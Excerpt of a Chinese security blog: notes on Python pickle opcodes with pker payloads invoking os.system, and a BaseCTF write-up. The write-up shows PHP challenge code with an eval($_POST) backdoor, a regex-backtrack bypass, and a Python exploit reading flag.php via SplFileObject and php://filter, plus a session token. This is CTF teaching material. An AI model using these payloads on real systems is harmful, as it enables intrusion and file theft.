#读出当前行后面的全部数据,然后进行Unicode解码,将解码内容压栈b&#x27;V\\u0061\n.&#x27;</span><br><span class="line">BINUNICODE     = b&#x27;X&#x27;   #读出4字节数据通过unpack使用&lt;I格式解压,将解压得到的数据作为长度,然后进行数据读取b&#x27;X\x10\x00\x00\x00abcdef0123456789.&#x27;</span><br><span class="line">APPEND         = b&#x27;a&#x27;   #先pop出栈一个变量var1,然后获取当前栈顶元素var2,执行栈顶元素的append函数,就是将一开始的栈顶元素弹出,然后又加到下一个栈顶数组中b&quot;]S&#x27;S1nKk&#x27;\na.&quot; =&gt; 得到[&#x27;S1nKk&#x27;]</span><br><span class="line">BUILD          = b&#x27;b&#x27;   #这个操作就是设置元素属性的操作</span><br><span class="line"># 先pop出栈一个变量var1,然后获取当前栈顶元素var2,获取var2的__setstate__子成员作为var3,如果var3非空,那就执行var3(var1),这个操作正常就是通过__setstate__设置变量的属性</span><br><span class="line"># 但是上面的var3为空也有别的处理:</span><br><span class="line"># 1.检查var1是否为tuple类型且长度为2,如果是的话那就将其分别赋值为state,slotstate</span><br><span class="line"># 2.检查state是否为空,如果不为空尝试取出state.items()然后使用k,v键值对的方式便利,最后通过修改var2.__dict__的方式修改var2的属性,也就是使得var2[k]=v,var2.k=v</span><br><span class="line"># 3.检查slotstate是否为空,如果不为空和第2步一样,取出slotstate.items()通过k,v键值对方式遍历,然后使用setattr方法设置var2属性,最后效果也是var2[k]=v,var2.k=v</span><br><span class="line">GLOBAL         = b&#x27;c&#x27;   #导入一个模块,首先读取当前行后面的全部内容适应utf-8解码得到的字符串作为module,然后再读出下一行的内容同样解析出字符串作为那么,最后导入module.name这个包</span><br><span class="line">DICT           = b&#x27;d&#x27;   #将栈中的数据弹出到上一个Mark为止,然后按照key:value的方式逐个解析然后放入到一个字典中,将最后得到的字典压栈b&quot;(S&#x27;key1&#x27;\nS&#x27;val1&#x27;\nS&#x27;key2&#x27;\nS&#x27;val2&#x27;\nd.&quot; =&gt; &#123;&#x27;key1&#x27;: &#x27;val1&#x27;, &#x27;key2&#x27;: &#x27;val2&#x27;&#125;</span><br><span class="line">EMPTY_DICT     = b&#x27;&#125;&#x27;   #没什么好说的,就是往栈中压入一个空字典</span><br><span class="line">APPENDS        = b&#x27;e&#x27;   #先将栈中元素不断弹出知道Mark标记,然后将弹出的全部元素放入items中,再取出栈顶作为list_obj,之后执行下面两步操作:</span><br><span class="line"># 1.先取出extend=list_obj.extend,然后执行extend(items)</span><br><span class="line"># 2.取出append = list_obj.append,然后使用for循环遍历items得到item,然后每次循环都执行一次append(item)</span><br><span class="line"># 看到这里应该想到函数触发的方法,我们只需要使用b操作将list_obj的extend改为一个危险的函数方法,然后再让参数进入items,就可以通过extend(items)的方式调用任意构造的危险函数了</span><br><span class="line">GET            = b&#x27;g&#x27;   #读取后面的全部本行数据,然后转为int类型放入变量i中,使用i作为索引,从缓存区取出数据mem[i],然后将这个从缓存中取出的变量压栈</span><br><span class="line">BINGET         = b&#x27;h&#x27;   #后面读取一个字节的数据,然后使用字符16进制大小作为下标索引,从缓存mem中读数据,将读出的内容压栈,下面就是一个获取缓存中下标为1的数据的实例b&quot;S&#x27;h0cksr&#x27;\np1\nS&#x27;t&#x27;\n0h\x01.&quot;</span><br><span class="line">INST           = b&#x27;i&#x27;   #两次pop出栈读出数据并且均进行解码操作使其变为字符串格式,</span><br><span class="line"># 1. 第一第二次弹出的数据分别放入module和name中,先导入moudle模块,然后name通过.逐个获取出里面的子成员,最后返回目标子成员(可能是函数也可能是类或变量)var1</span><br><span class="line"># 2. 继续进行出栈,直到遇到Mark标志,将出栈的数据作为参数,var1位方法,执行var1(Mark弹出数据)</span><br><span class="line"># 3. 将生成的实例化对象压栈</span><br><span class="line">LONG_BINGET    = b&#x27;j&#x27;   #先读出4字节大小数据流,然后通过unpack使用&lt;I格式解压得到int类型数据i,将i作为下标,从缓存中获取变量mem[i],将获取到的数据压栈</span><br><span class="line">LIST           = b&#x27;l&#x27;   #将上一次Mark之后的数据全部弹出,并且将其存放到一个数组中,然后在将这个数组压栈b&quot;(S&#x27;S1nKk&#x27;\np1\nS&#x27;t&#x27;\nl.&quot;</span><br><span class="line">EMPTY_LIST     = b&#x27;]&#x27;   #没什么好说,往栈中压入一个空数组</span><br><span class="line">OBJ            = b&#x27;o&#x27;   #先是将上一次Mark之后的数据全部弹出,得到一个数组var1,然后又在var1中pop取出最后一个数据作为var2,之后执行以下过程:</span><br><span class="line"># 1.检查弹出数据后的var1数组是否为空,如果var1非空,或者弹出的var2属于type类型,或者弹出的var2有__getinitargs__属性成员,那么就会执行var2(var1)</span><br><span class="line"># 2.如果以上条件均不满足,那就执行var2.__new__(var2)</span><br><span class="line"># 3.将执行结果压入栈中</span><br><span class="line">PUT            = b&#x27;p&#x27;   #读取后面全部当前行的数据,然后转为int类型的变量i,然后赋值当前栈顶元素存到memo[i]中</span><br><span class="line">BINPUT         = b&#x27;q&#x27;   #和上一个一样,不同的是下标i是通过读取1个字节的数据,然后直接当做下标</span><br><span class="line">LONG_BINPUT    = b&#x27;r&#x27;   #和上一个一样,不同的是下标i是通过读取4个字节的数据,然后通过unpack使用&lt;I模式解压得到的整数当做下标</span><br><span class="line">SETITEM        = b&#x27;s&#x27;   #先在栈中pop弹出第一个数据作为value,然后在pop弹出第二个元素作为key,再获取当前栈顶元素记为dict,给栈顶元素赋值dict[key]=value</span><br><span class="line">TUPLE          = b&#x27;t&#x27;   #弹出上一次Mark之后的全部数据大农一个list数组中,然后使用tuple函数将其转为元组格式再把这个元组压入栈中</span><br><span class="line">EMPTY_TUPLE    = b&#x27;)&#x27;   #没什么好说,往栈中压入一个空元组</span><br><span class="line">SETITEMS       = b&#x27;u&#x27;   #先弹出上一次Mark之后的全部元素放入一个数组items中,然后获取栈顶元素记为dict,通过i=0,2,3...获取items中的数据,执行dict[items[i]] = items[i + 1]给栈顶的字典元素添加键值对</span><br><span class="line">BINFLOAT       = b&#x27;G&#x27;   #先读取8字节数据,然后使用unpack通过&lt;d格式的解压,将得到的float数据压栈</span><br><span class="line"></span><br><span class="line">TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line"></span><br><span class="line"># Protocol 2</span><br><span class="line"></span><br><span class="line">PROTO          = b&#x27;\x80&#x27;  #用于声明pickle协议版本</span><br><span class="line">NEWOBJ         = b&#x27;\x81&#x27;#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈</span><br><span class="line">EXT1           = b&#x27;\x82&#x27;  #&#x27;&#x27;&#x27;\x82,\x83,\x84这三个操作都是和extension registry扩展注册表有关的,但是拓展注册表主要维护4个从copyreg导入的映射字典</span><br><span class="line">EXT2           = b&#x27;\x83&#x27;  #     dispatch_tablecopyreg, _extension_registry, _inverted_registry, _extension_cache</span><br><span class="line">EXT4           = b&#x27;\x84&#x27;  #     但是从头到尾貌似这几个核心表单都没有发生过变化(也可能是我没注意到而已)&#x27;&#x27;&#x27;</span><br><span class="line">TUPLE1         = b&#x27;\x85&#x27;  #将栈顶元素弹出放到一个元组中再将这个元组压栈,就是将栈顶放到一个元组里面的作用b&quot;S&#x27;S1nk&#x27;\n\x85.&quot; =&gt; (&#x27;S1nk&#x27;,)</span><br><span class="line">TUPLE2         = b&#x27;\x86&#x27;  #将栈顶的两个元素弹出,栈顶弹出为var1,继续弹出一个为var2,然后组成一个元组然后将这个元组压栈,得到(var2,var1),b&quot;S&#x27;S1nk&#x27;\nS&#x27;S1nKk&#x27;\n\x86.&quot; =&gt; (&#x27;S1nk&#x27;, &#x27;S1nKk&#x27;)</span><br><span class="line">TUPLE3         = b&#x27;\x87&#x27;  #和上面一样,不够该操作是弹出三个元素形成元组b&quot;S&#x27;S1nK&#x27;\nS&#x27;S11nK&#x27;\nS&#x27;S111nK&#x27;\n\x87.&quot; =&gt; (&#x27;S1nK&#x27;, &#x27;S11nK&#x27;, &#x27;S111nk&#x27;)</span><br><span class="line">NEWTRUE        = b&#x27;\x88&#x27;  #向栈中压入一个True</span><br><span class="line">NEWFALSE       = b&#x27;\x89&#x27;  #向栈中压入一个False</span><br><span class="line">LONG1          = b&#x27;\x8a&#x27;  #先读取一个字节,以该字节16进制数为大小size,从后面的数据读取size个字节,然后将读取到的数据转为long类型</span><br><span class="line">LONG4          = b&#x27;\x8b&#x27;  #读取4字节数据,通过unpack的&lt;i格式将数据解压得到一个整数,以这个整数为字节大小读取后面的数据</span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]#就是元组操作合集,分别是向栈中压入空数组,将最后1个元素放入元组后将元组压栈,将最后2个元素放入元组后将元组压栈,将最后3个元素放入元组后将元组压栈</span><br><span class="line"></span><br><span class="line"># Protocol 3 (Python 3.x)#这里要注意一下,后面的操作是有python3方才支持</span><br><span class="line"></span><br><span class="line">BINBYTES       = b&#x27;B&#x27;   #先读取4字节数据通过unpack使用&lt;i格式将数据解压,将得到的结果作为大小向后读取相应字节数,然后将读取到的全部字节压栈,注意一下,压栈的是原始的比特流数据b&#x27;B\x06\x00\x00\x00h0cksr.&#x27; =&gt; b&#x27;S1nKk&#x27;</span><br><span class="line">SHORT_BINBYTES = b&#x27;C&#x27;   #读取一个字节,以它的16进制数作为大小向后读取对应字节的数据b&#x27;C\x06h0cksr.&#x27; =&gt; b&#x27;S1nKk&#x27;</span><br><span class="line"></span><br><span class="line"># Protocol 4</span><br><span class="line">SHORT_BINUNICODE = b&#x27;\x8c&#x27;  #先读取一个字节,以这个字节的16进制为大小向后读取对应字节的数据,然后使用utf-8的格式解码数据为字符串格式,然后将这个字符串压栈b&#x27;\x8c\x06S1nKk.&#x27; =&gt; S1nKk</span><br><span class="line">BINUNICODE8      = b&#x27;\x8d&#x27;  #先读取8字节数据然后通过unpack使用&lt;Q格式解压数据,将得到的结果作为大小向后读取相应字节数,然后将读取到的数据使用utf-8格式解压为字符串,将字符串压栈b&#x27;\x8d\x06\x00\x00\x00\x00\x00\x00\x00h0cksr.&#x27; =&gt; h0cksr</span><br><span class="line">BINBYTES8        = b&#x27;\x8e&#x27;  #同上读取8字节数据&lt;Q格式解压,然后读取数据,但是直接将比特流数据压栈而不会解码b&#x27;\x8e\x06\x00\x00\x00\x00\x00\x00\x00S1nKk.&#x27; =&gt; b&#x27;S1nKk&#x27;</span><br><span class="line">EMPTY_SET        = b&#x27;\x8f&#x27;  #向栈中压入一个set类型的空集合(set()没有指定iterable的时候返回的是一个空集合)</span><br><span class="line">ADDITEMS         = b&#x27;\x90&#x27;  #先pop弹出一个元素作为items,记栈顶元素为top,然后检查top是否为set类型,如果是的话就执行top.update(items),如果top不是set类型那就使用for遍历items,逐个执行top.add(item)</span><br><span class="line">FROZENSET        = b&#x27;\x91&#x27;  #弹出栈顶元素作为items,然后执行frozenset(items)生成一个frozenset类型的变量,并将这个变量压栈</span><br><span class="line">NEWOBJ_EX        = b&#x27;\x92&#x27;#(这个很有用)  #和NEWOBJ差不多,先从栈中弹出三个元素,第一个,第二个,第三个弹出的元素分别记为var1,var2,var3,然后执行cls.__new__(var3, *var2, **var1)之后将执行生成的对象压栈</span><br><span class="line">STACK_GLOBAL     = b&#x27;\x93&#x27;#(这个很有用)  #和GLOBAL操作一样但是导入的模块从栈上获取,先弹出一个元素为name,然后再弹出一个元素moudle,要求两个元素都必须是字符串类型,然后到处moudle.name,在将导出的内容压栈b&quot;S&#x27;os&#x27;\nS&#x27;system&#x27;\n\x93.&quot; =&gt; os.system</span><br><span class="line">MEMOIZE          = b&#x27;\x94&#x27;  #将当前栈顶元素添加到缓存列表的末尾(注意栈顶不会弹出)</span><br><span class="line">FRAME            = b&#x27;\x95&#x27;  #后面先是读取8字节数据通过unpack使用&lt;Q格式将数据解压得到的结果作为大小,向后读取对应字节的数据,然后将读取到的数据进行正常pickle反序列化(感觉用不用这个操作没啥差别,但是细节差别的话看源码)</span><br></pre></td></tr></table></figure>
<p>来自h0cksr师傅</p>
<h4 id="pickletools的使用">pickletools的使用</h4>
<p>pickletools是python的一个内建模块,常用的方法有<code>pickletools.dis()</code>,用于把一段opcode转换为易读的形式,如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;c__main__</span><br><span class="line">secret</span><br><span class="line">(S&#x27;secret&#x27;</span><br><span class="line">S&#x27;Hack!!!&#x27;</span><br><span class="line">db.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">pickletools.dis(opcode)</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: c    GLOBAL     &#x27;__main__ secret&#x27;</span><br><span class="line">   17: (    MARK</span><br><span class="line">   18: S        STRING     &#x27;secret&#x27;</span><br><span class="line">   28: S        STRING     &#x27;Hack!!!&#x27;</span><br><span class="line">   39: d        DICT       (MARK at 17)</span><br><span class="line">   40: b    BUILD</span><br><span class="line">   41: .    STOP</span><br><span class="line">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>
<h4 id="pker的使用">pker的使用</h4>
<p>pker是一个可以把python语言翻译成opcode的工具.</p>
<p>pker支持这三种操作</p>
<ul>
<li>变量赋值：
<ul>
<li>左值可以是变量名，dict或list的item，对象成员</li>
<li>右值可以是基础类型字面量，函数调用</li>
</ul>
</li>
<li>函数调用</li>
<li>return：可返回0~1个参数</li>
</ul>
<p>pker内置了三个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure>
<p>可以用return返回一个对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return           =&gt;  .</span><br><span class="line">return var       =&gt;  g_\n.</span><br><span class="line">return 1         =&gt;  I1\n.</span><br><span class="line">#pker_test.py</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">s = &#x27;id&#x27;</span><br><span class="line">lst = [i]</span><br><span class="line">tpl = (0,)</span><br><span class="line">dct = &#123;tpl: 0&#125;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s)</span><br><span class="line">return</span><br><span class="line">#命令行下</span><br><span class="line"></span><br><span class="line">$ python3 pker.py &lt; pker_tests.py</span><br><span class="line"></span><br><span class="line">b&quot;I0\np0\n0S&#x27;id&#x27;\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.&quot;</span><br></pre></td></tr></table></figure>
<h2 id="利用">利用</h2>
<h3 id="变量覆盖">变量覆盖</h3>
<p>假设存在类<code>Secret</code>,类有一个<code>name</code>属性,那我们可以通过pickle反序列化修改这个属性的值.</p>
<p>下面这个例子当中将原本的s.name属性ssz修改为了zmr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">class Secret:</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">s=Secret(&quot;ssz&quot;)</span><br><span class="line">print(s.name)</span><br><span class="line">opcode=b&quot;&quot;&quot;c__main__</span><br><span class="line">s</span><br><span class="line">(S&#x27;name&#x27;</span><br><span class="line">S&#x27;zmr&#x27;</span><br><span class="line">db.&quot;&quot;&quot;</span><br><span class="line">pickle.loads(opcode)</span><br><span class="line">print(s.name)</span><br><span class="line"># pickletools.dis(opcode)</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250429213501354.png" alt="image-20250429213501354"></p>
<p><code>opcode</code> 的含义 (逐个字节码指令分析)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&quot;&quot;&quot;c__main__    # GLOBAL &#x27;__main__&#x27; </span></span><br><span class="line"><span class="string">s            # Push &#x27;s&#x27; (这个是上面的 Secret 对象 s)</span></span><br><span class="line"><span class="string">(            # MARK — 开始一个元组</span></span><br><span class="line"><span class="string">S&#x27;name&#x27;      # Push 字符串 &#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;zmr&#x27; 		 # Push 字符串 &#x27;Funny_M0nk3y&#x27;</span></span><br><span class="line"><span class="string">d            # DICT — 构造一个 dict：&#123;&#x27;name&#x27;: &#x27;Funny_M0nk3y&#x27;&#125;</span></span><br><span class="line"><span class="string">b.           # BUILD + STOP — 把这个 dict 应用到 s（调用 __setstate__ 或更新 __dict__）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>具体解释**<code>b</code>（BUILD）**：从栈上取出两个对象，一个是目标对象（比如类的实例），另一个是一个 <code>dict</code>，然后把这个 <code>dict</code> 里面的内容应用到目标对象上。</p>
<ul>
<li>如果这个对象有 <code>__setstate__</code> 方法，就调用它。</li>
<li>如果没有，就默认执行：<code>obj.__dict__.update(state_dict)</code></li>
</ul>
<p>在这个例子中，就是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s.__dict__.update(&#123;&#x27;name&#x27;: &#x27;Funny_M0nk3y&#x27;&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pickle反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>baseCtf</title>
    <url>/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我记得她...好像叫flag.php吧？</span></span><br><span class="line"><span class="variable">$emp</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;e_m.p&#x27;</span>];</span><br><span class="line"><span class="variable">$try</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;try&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$emp</span>!=<span class="string">&quot;114514&quot;</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$emp</span>,<span class="number">0</span>)===<span class="number">114514</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$emp</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$emp</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="variable">$try</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">stripos</span>(<span class="variable">$try</span>,<span class="string">&#x27;HACKER&#x27;</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$b</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>))-&gt;<span class="variable">$c</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span></span><br><span class="line"><span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>全程建议在python中进行，因为后面需要。</p>
<p>第四行$emp=$_GET[‘e_m.p’];当中的e_m.p很奇怪:</p>
<p>我们上传时他会把空格、点和[转化为下划线(’ ‘、’.‘、’[]‘—&gt;’_')，但是如果有多个这样的字符同时出现，在[之后的字符并不会被转化(例如：e[m.p会被转化为e_m.p，后面的点不会转化)<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?e[m.p=114514a</span><br></pre></td></tr></table></figure>
<p>ctype_alpha()用于检查字符串中的所有字符是否都是字母。它会返回一个布尔值.<br>
所以这里需要改一下payload，把其变为小数即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?e[m.p=114514.1</span><br></pre></td></tr></table></figure>
<p>当进入下一步时我们进的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;</span><br><span class="line">	die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);</span><br><span class="line">&#125;</span><br><span class="line">stripos用于查找一个字符串在另一个字符串中首次出现的位置，且不区分大小写</span><br></pre></td></tr></table></figure>
<p>而不是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;</span><br><span class="line">	die(&quot;你是hacker还敢自报家门呢？&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们绕过这里需要传入post:	try=“HACKER”</p>
<p>进入2if之后我们需要使用preg_match的一个漏洞，叫做正则回溯绕过(PHP 为了防止正则表达式导致的拒绝服务攻击（reDOS），设置了回溯次数上限 <code>pcre.backtrack_limit</code>。当回溯次数超过这个上限时，正则匹配会失败，最终返回flase，上限是一百万次)</p>
<p>所以我们在这里需要用到python进行上传一百万次，上传内容为任意的就可以。在python中的post是req = requests.post(url,data = {“try”:“-”*1000001+“HACKER”})</p>
<p>题目最后有一个(new $a($b))-&gt;$c();肯定是需要某种函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(new $a($b))-&gt;$c()` 的含义是：</span><br><span class="line"></span><br><span class="line">1. 动态创建一个类 `$a` 的实例，将 `$b` 作为构造函数的参数。</span><br><span class="line">2. 在创建的对象上调用动态方法 `$c`。</span><br></pre></td></tr></table></figure>
<p>php当中有个叫原生类，其中有一个是SplFileInfo类	为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">echo $context;</span><br></pre></td></tr></table></figure>
<p>__toString为php当中的魔术方法<a href="https://twle.cn/c/yufei/phpmmethod/phpmmethod-basic-tostring.html%EF%BC%8C%E5%B0%B1%E6%98%AF%E6%8A%8Axxx%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BD%A2%E5%BC%8F">https://twle.cn/c/yufei/phpmmethod/phpmmethod-basic-tostring.html，就是把xxx格式化为字符串的形式</a></p>
<p>最终py代码</p>
<p>应该是需要cookie的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20485/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=bpqtmghh3a37skpd5j4llsen8n; GZCTF_Token=CfDJ8OFqC_Tx7MRPs9YhqUz921HYUxlf1QEaeMWSFvArY3wjhBND9izsq6kcKcdf6kH8kxorK1U1aWAmJ1hk9tiXKmpz0of2T0Jylmvcyn1Ojp1sAH8uIvmLBB3oXwwaXsm5smllmEr-FfLpy-rzM3kOJQu7c4S6OoEtxdOf2A5qrjiOsD1E2nIH7pxN0tELKCxt7lGhkcMcK3bPVObj5W1bQ1idFqkg2PBHxBBBpkc_y1hiy8Qz8cwM0plrc4kM5YIyQs0xjeZZGixn5BUm_GbSQmtOq2Qz6wR97adzIzIk7619zDs39Phg9O6Kpem47VnlYyu0xafqFbba5okjF_C9yDfNlQ5yGhJ7rTm-sQZwk6th-3AsntWXgLtbjgtSlX6foWcxEFIMsRnAsTXb6cC7CsIV9QvE7OZuV9USfWBG2RKir02JbvUSK_d6uOF98FlxutkP2TZO-RoafwUh-Iuf82DX5tDBFqyJN0QEK7SLWVQDIn-img1M-Tf3BlimSY_3M2jvs9NSRTF5BoRA1YKfuXXPZIHOh9Uy3kFCdwUm9C9Y5abMd6pdTFL_iREKvBv360EM7TUl1Dgn4jcRPifJQicGqJW2tkJseYpHM7Gjmsf6akzsN6RAiLWExnJoNhBWs3L9zMDX6xz_xzFNFMlyiguUKzM9gdZWZnafS6x9WQfxomBSfmub6ShU9aTCb0lEpRdbI_DGLso41txLNOODFFrRuMQsa8BShl4Nt6jVmA3N&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">req = urllib.request.Request(url, headers=headers)</span><br><span class="line">req = requests.post(url,data = &#123;<span class="string">&quot;try&quot;</span>:<span class="string">&quot;-&quot;</span>*<span class="number">1000001</span>+<span class="string">&quot;HACKER&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgPUJhc2VDVEZ7NDNiYjZiODktNmUzZi00MzBhLTllZjMtMTU0ZTE2NzNmYzQ1fT8+Cg==</span><br><span class="line">BaseCTF&#123;43bb6b89-6e3f-430a-9ef3-154e1673fc45&#125;</span><br></pre></td></tr></table></figure>
<h1>Aura 酱的礼物</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你好呀, Aura 酱，这是给你的礼物哦~ 快打开看看里面是什么吧！</span><br><span class="line"></span><br><span class="line">Aura 的博客似乎没有留言区？但是真的要去 Aura 的博客里面找吗？可以换个地方找吗？</span><br><span class="line"></span><br><span class="line">哪里有感谢的一句话呢？远在天边，似乎就在眼前，就决定是他了吧！</span><br><span class="line"></span><br><span class="line">为什么 Flag 是空的？不对劲，base64 一下再看看？</span><br><span class="line"></span><br><span class="line">推荐搜索关键词: 伪协议，SSRF</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> 